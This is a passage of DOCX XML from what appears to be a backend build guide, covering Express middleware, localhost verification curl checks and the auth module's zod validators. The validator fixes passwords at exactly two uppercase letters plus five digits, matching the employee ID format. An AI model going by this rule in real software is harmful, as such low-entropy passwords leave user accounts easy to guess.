            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>// 13b. centralised error handler — MUST be last</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>app.use(errorHandler);</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const server = app.listen(env.PORT, () =&gt; logger.info({ port: env.PORT }, 'Server ready'));</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>process.on('SIGTERM', () =&gt; server.close(() =&gt; process.exit(0)));</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>process.on('SIGINT',  () =&gt; server.close(() =&gt; process.exit(0)));</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>3.5  Why Each Middleware Earns Its Spot</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3400"/>
        <w:gridCol w:w="3400"/>
        <w:gridCol w:w="3400"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>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w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>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Middleware</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6917"/>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Defends against / provides</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>helmet</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6917"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Clickjacking (X-Frame-Options), MIME-sniffing (X-Content-Type-Options), HTTPS downgrade (HSTS), XSS surface (CSP) — 15+ headers in one line</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="73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2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="198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cors</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="69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Browsers enforce same-origin by default; CORS opens our API to localhost:5173 ONLY. credentials:true is mandatory for the refresh cookie to flow.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>compression</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6917"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>gzip / brotli on JSON responses — ~70% bandwidth savings; helps p95 latency NFR</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="73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4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="198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express.json</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="69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Parse JSON body. The 1MB limit prevents memory-exhaustion DoS.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>5</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>cookie-parser</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6917"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Populates req.cookies from the Cookie header. Required to read the refresh token cookie on /auth/refresh.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="73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6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="198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pino-http</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="69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One JSON log line per request (method, url, status, duration, requestId). Redact rules scrub Authorization automatically.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="737"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>13a</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>notFoundHandler</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="6917"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>Catches every URL no router answered for; emits standard NOT_FOUND envelope.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="73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13b</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="198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errorHandler</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="69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Centralised envelope; never leaks stack traces; turns ZodError into 422 details[].</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>3.6  Verification Gate for STEP 2</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bash</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t># /healthz still works</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>curl http://localhost:3000/healthz</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t># → {"ok":true,"uptime":...,"env":"development"}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Unknown URL → standard NOT_FOUND envelope</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>curl -i http://localhost:3000/api/v1/nope</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t># → HTTP/1.1 404 Not Found</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t># → {"error":{"code":"NOT_FOUND","message":"Route not found: GET /api/v1/nope","details":null}}</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helmet headers present</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>curl -I http://localhost:3000/healthz | grep -iE 'x-content-type-options|x-frame-options'</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t># → x-content-type-options: nosniff</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t># → x-frame-options: SAMEORIGIN</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="10200"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="10200"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCFCE7"/>
            <w:tcBorders>
              <w:left w:val="single" w:sz="24" w:color="16A34A"/>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="80"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="16A34A"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">VERIFIED  ·  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="21"/>
              </w:rPr>
              <w:t>STEP 2 acceptance</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Standard envelope shape returned on every error path.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>helmet headers visible in raw curl -I output.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>compression header (Content-Encoding: gzip) appears on responses larger than the default threshold.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="480" w:after="200"/>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="4" w:color="4F5DFF"/>
        </w:pBdr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="4F5DFF"/>
          <w:sz w:val="48"/>
        </w:rPr>
        <w:t>Part IV  ·  STEP 3  ·  Auth Module</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="4B5563"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>The largest step. Builds the entire authentication surface bottom-up: validators define the contract → utils provide crypto + cookie helpers → repos own SQL → service applies BR-AUTH rules → controller shapes HTTP → routes wire URLs. Plus two middleware pieces (authenticate + rateLimit) pulled forward from STEP 4 because the routes depend on them.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>4.1  Build Order Inside the Module</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layering</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>Routes        ← thin wiring (URL → controller)        auth.routes.js</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>Controller    ← HTTP req/res ↔ service params           auth.controller.js</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>Service       ← BR-AUTH-01..07, state, transactions     auth.service.js</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>Repository    ← raw SQL, parameter binding              users.repo.js / refreshTokens.repo.js / loginAudit.repo.js</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>Helpers       ← validators, utils                       auth.validators.js / utils/crypto.js / utils/cookies.js</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>Database      ← (Phase 3 sealed)                        MySQL `final`</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>4.2  auth.validators.js — The Input Contract</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Two zod schemas. loginSchema is also mirrored on the frontend so both edges enforce the same rule.</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src/modules/auth/auth.validators.js</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>'use strict';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const { z } = require('zod');</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2 uppercase letters + 5 digits (e.g. SA79900)</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const PASSWORD_REGEX = /^[A-Z]{2}[0-9]{5}$/;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const FORMAT_HINT = 'Format: 2 uppercase letters + 5 digits (e.g. SA79900)';</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const loginSchema = z.object({</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  employee_id: z.string().length(7, FORMAT_HINT).regex(PASSWORD_REGEX, FORMAT_HINT),</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  password:    z.string().length(7, FORMAT_HINT).regex(PASSWORD_REGEX, FORMAT_HINT),</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}).strict();   // .strict() rejects unknown fields → no payload smuggling</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const refreshSchema = z.object({}).strict();  // /refresh body must be empty; cookie + header carry state</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module.exports = { loginSchema, refreshSchema, PASSWORD_REGEX };</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="10200"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="10200"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FEF3C7"/>
            <w:tcBorders>
              <w:left w:val="single" w:sz="24" w:color="B45309"/>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="80"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="B45309"/>
